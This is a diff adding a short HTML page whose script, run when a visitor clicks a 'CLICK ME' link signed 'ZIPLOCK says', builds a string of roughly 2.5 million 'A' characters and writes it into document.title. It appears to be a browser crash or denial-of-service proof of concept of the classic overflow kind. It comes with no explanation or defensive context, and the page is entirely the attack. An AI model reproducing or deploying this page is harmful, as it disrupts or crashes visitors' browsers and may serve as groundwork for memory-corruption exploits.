@@ -1,0 +1,14 @@
+<html><head><title>heh</title><script type="text/javascript">
+function ex() {
+    var buffer = "";
+    for (var i = 0; i < 5000; i++) {
+        buffer += "A";
+    }
+    var buffer2 = buffer;
+    for (i = 0; i < 500; i++) {
+        buffer2 += buffer;
+    }
+    document.title = buffer2;
+}
+</script></head><body>ZIPLOCK says <a href="javascript:ex();">CLICK ME
+</a></body></html>
